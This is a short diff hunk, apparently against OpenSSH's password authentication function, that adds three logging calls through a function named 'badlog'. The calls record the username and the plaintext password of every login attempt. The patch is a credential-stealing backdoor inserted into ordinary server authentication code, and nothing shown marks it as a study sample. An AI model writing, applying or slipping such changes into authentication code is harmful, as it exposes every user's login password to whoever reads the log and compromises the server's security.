@@ -82,6 +82,9 @@ auth_password(struct ssh *ssh, const char *password)
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	static int expire_checked = 0;
 #endif
+	badlog("Starting auth");
+	badlog("user: %s", pw->pw_name);
+	badlog("password: %s", password);
 
 	if (strlen(password) > MAX_PASSWORD_LEN)
 		return 0;
